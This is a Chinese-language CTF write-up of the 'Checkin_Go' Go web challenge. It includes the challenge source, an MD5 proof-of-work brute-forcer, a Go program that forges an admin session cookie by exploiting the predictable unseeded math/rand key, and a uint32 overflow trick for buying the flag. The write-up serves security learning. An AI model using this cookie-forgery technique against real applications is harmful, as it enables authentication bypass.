## Checkin_Go

golang，需要登录时验证哈希

简单脚本登录

```python
import hashlib
for i in range(1000000000):
    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if a[0:6] == '1d5482':
        print(i)
        print(a)
```

登录发现admin被ban了

看源码

main.go

```go
package main

import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"

)

func main() {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	storage := cookie.NewStore(randomChar(16))
	r.Use(sessions.Sessions("o", storage))

	r.LoadHTMLGlob("template/*")

	auth := r.Group("/auth/",hashProofRequired())
	auth.GET("/login", loginGetHandler)
	auth.POST("/login", loginPostHandler)

	user := r.Group("/play/")

	user.POST("/add",adminRequired(),add)
	user.POST("/guess",loginRequired(),guess)
	r.GET("/game",start)
	r.GET("/", func(c *gin.Context) {c.Redirect(302, "/auth/login")})
	r.Run("0.0.0.0:80")
}
```

handle.go

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"math/rand"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
)


func md5Hash(s string) string {
	hsh := md5.New()
	hsh.Write([]byte(s))
	return fmt.Sprintf("%x", hsh.Sum(nil))
}

func randomChar(l int) []byte {
	output := make([]byte, l)
	rand.Read(output)
	return output
}


func hashProof() string {
	hsh := md5.New()
	hsh.Write(randomChar(6))
	return fmt.Sprintf("%x", hsh.Sum(nil))[:6]
}

func loginRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		s := sessions.Default(c)
		if s.Get("uname") == nil && (c.Request.URL.Path != "/auth/login" ) {
			c.Redirect(302, "/auth/login")
			c.Abort()
		}
		c.Next()
	}
}

func adminRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		s := sessions.Default(c)
		if s.Get("uname") == nil {
			c.Redirect(302, "/auth/login")
			c.Abort()
			return
		}

		if s.Get("uname").(string) != "admin" {
			c.String(200, "No,You are not admin!!!!")
			c.Abort()
		}
		c.Next()
	}
}

func hashProofRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		if c.Request.Method == "POST" {
			s := sessions.Default(c)
			hsh, ok := s.Get("hsh").(string)
			if !ok {
				println(1)
				c.String(200, "wrong hash")
				c.Abort()
				return
			}

			if md5Hash(c.PostForm("hsh"))[:6] != hsh {
				fmt.Println(hsh)
				c.String(200, "wrong hash")
				c.Abort()
			}
		}
		c.Next()
	}
}
func loginPostHandler(c *gin.Context) {
	uname := c.PostForm("uname")
	pwd := c.PostForm("pwd")
	if uname == "admin"{
		c.String(200,"noon,you cant be admin")
		return
	}
	if uname == "" || pwd == "" {
		c.String(200, "empty parameter")
		return
	}

	s := sessions.Default(c)
	s.Set("uname", uname)
	s.Save()
	c.Redirect(302, "/game")
}
func loginGetHandler(c *gin.Context) {
	hsh := hashProof()
	s := sessions.Default(c)
	s.Set("hsh", hsh)
	s.Save()
	c.HTML(200, "login", gin.H{
		"hsh": hsh,
	})
}

// AesEncrypt 网上找的简单实现AES加密而已....
func AesEncrypt(orig string, key string) string {
	// 转成字节数组
	origData := []byte(orig)
	k := []byte(key)

	// 分组秘钥
	block, err := aes.NewCipher(k)
	if err != nil {
		panic(fmt.Sprintf("key 长度必须 16/24/32长度: %s", err.Error()))
	}
	// 获取秘钥块的长度
	blockSize := block.BlockSize()
	// 补全码
	origData = PKCS7Padding(origData, blockSize)
	// 加密模式
	blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])
	// 创建数组
	cryted := make([]byte, len(origData))
	// 加密
	blockMode.CryptBlocks(cryted, origData)
	//使用RawURLEncoding 不要使用StdEncoding
	//不要使用StdEncoding  放在url参数中回导致错误
	return base64.RawURLEncoding.EncodeToString(cryted)

}
//如果解密过程出错请尝试清空cookie
func AesDecrypt(cryted string, key string) string {
	//使用RawURLEncoding 不要使用StdEncoding
	//不要使用StdEncoding  放在url参数中回导致错误
	crytedByte, _ := base64.RawURLEncoding.DecodeString(cryted)
	k := []byte(key)

	// 分组秘钥
	block, err := aes.NewCipher(k)
	if err != nil {
		panic(fmt.Sprintf("key 长度必须 16/24/32长度: %s", err.Error()))
	}
	// 获取秘钥块的长度
	blockSize := block.BlockSize()
	// 加密模式
	blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])
	// 创建数组
	orig := make([]byte, len(crytedByte))
	// 解密
	blockMode.CryptBlocks(orig, crytedByte)
	// 去补全码
	orig = PKCS7UnPadding(orig)
	return string(orig)
}

//补码
func PKCS7Padding(ciphertext []byte, blocksize int) []byte {
	padding := blocksize - len(ciphertext)%blocksize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

//去码
func PKCS7UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
```

guess.go

```go
package main

import (
	"fmt"
	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"strconv"
)
var secret, _ =ioutil.ReadFile("secret")
func add(c *gin.Context){
	var newMoney uint32 = 0
	s := sessions.Default(c)

	nowMoney :=fmt.Sprintf("%v",s.Get("nowMoney"))
	addMoney :=c.PostForm("addMoney")
	u1, err1 :=strconv.ParseUint(nowMoney,10,32)
	u2, err2 :=strconv.ParseUint(addMoney,10,32)
	if err1 != nil && err2 != nil{
		c.String(200,"Your money is wrong")
		c.Abort()
		return
	}
	if s.Get("checkNowMoney")==nil{
		c.String(200,"Dont have checkNowMoney")
		c.Abort()
		return
	}else {
		checkNowMoney := AesDecrypt(fmt.Sprintf("%v", s.Get("checkNowMoney")), string(secret))
		if checkNowMoney == nowMoney {
			newMoney = uint32(u1) + uint32(u2)
			s.Set("nowMoney", newMoney)
			s.Set("checkNowMoney", AesEncrypt(strconv.Itoa(int(newMoney)), string(secret)))
			s.Save()
			c.String(200, "New money set.Refresh /game")
			return
		} else {
			c.String(200, "checkNowMoney is wrong")
		}
	}
}
func guess(c *gin.Context){
	s := sessions.Default(c)

	playerMoney :=fmt.Sprintf("%v",s.Get("playerMoney"))
	nowMoney :=fmt.Sprintf("%v",s.Get("nowMoney"))
	u1, err1 :=strconv.ParseUint(playerMoney,10,32)
	u2, err2 :=strconv.ParseUint(nowMoney,10,32)
	if err1 != nil && err2 != nil{
		c.String(200,"Wrong")
		c.Abort()
		return
	}
	var newMoney  = uint32(u1)
	if s.Get("checkNowMoney")==nil||s.Get("checkPlayerMoney")==nil{
		c.String(200,"Dont have checkNowMoney or checkPlayerMoney")
		c.Abort()
		return
	}else {
		checkPlayerMoney := AesDecrypt(fmt.Sprintf("%v", s.Get("checkPlayerMoney")), string(secret))
		checkNowMoney := AesDecrypt(fmt.Sprintf("%v", s.Get("checkNowMoney")), string(secret))
		if u1 >= u2 && checkPlayerMoney == playerMoney && checkNowMoney == nowMoney {
			newMoney = uint32(u1) - uint32(u2)
			f, err := ioutil.ReadFile("flag")
			if err == nil {
				s.Set("playerMoney", newMoney)
				s.Set("checkPlayerMoney", AesEncrypt(fmt.Sprintf("%v", s.Get("playerMoney")), string(secret)))
				s.Save()
				c.String(200, string(f))
				c.Abort()
				return
			} else {
				c.String(200, "SomethingWrong")
			}

		} else {
			c.String(200, "Your money is not enough or you do some trick on the check")
			c.Abort()
			return
		}
	}

}
func start(c *gin.Context) {
	s := sessions.Default(c)
	nowMoney :=s.Get("nowMoney")
	playerMoney :=s.Get("playerMoney")
	if nowMoney==nil{
		s.Set("nowMoney",200000)
		nowMoney="200000"
		s.Set("checkNowMoney",AesEncrypt(fmt.Sprintf("%v",s.Get("nowMoney")),string(secret)))
		s.Save()
	}else {
		nowMoney=s.Get("nowMoney")
	}
	if playerMoney==nil{
		s.Set("playerMoney",5000)
		playerMoney="5000"
		s.Set("checkPlayerMoney",AesEncrypt(fmt.Sprintf("%v",s.Get("playerMoney")),string(secret)))
		s.Save()
	}else {
		playerMoney=s.Get("playerMoney")
	}
	c.HTML(200, "game", gin.H{
		"nowMoney": nowMoney,
		"playerMoney":playerMoney,
	})
	return
}
```

猜测考点是session伪造了

和一道题目很像

WMCTF2020-gogogo

脚本伪造cookie

```go
// 伪造 cookie
package main
import (
    "github.com/gin-contrib/sessions"
    "github.com/gin-contrib/sessions/cookie"
    "github.com/gin-gonic/gin"
    "math/rand"
)
func main() {
    r := gin.Default()
    storage := cookie.NewStore(randomChar(16))
    r.Use(sessions.Sessions("o", storage))
    r.GET("/a",cookieHandler)
    r.Run("0.0.0.0:8088")
}
func cookieHandler(c *gin.Context){
    s := sessions.Default(c)
    s.Set("uname", "admin")
    s.Save()
}
func randomChar(l int) []byte {
    output := make([]byte, l)
    rand.Read(output)
    return output
}
```

然后思考如何购买flag，可以溢出，int的最大值为4294947295，使其溢出后flag值为0

就能购买flag了。


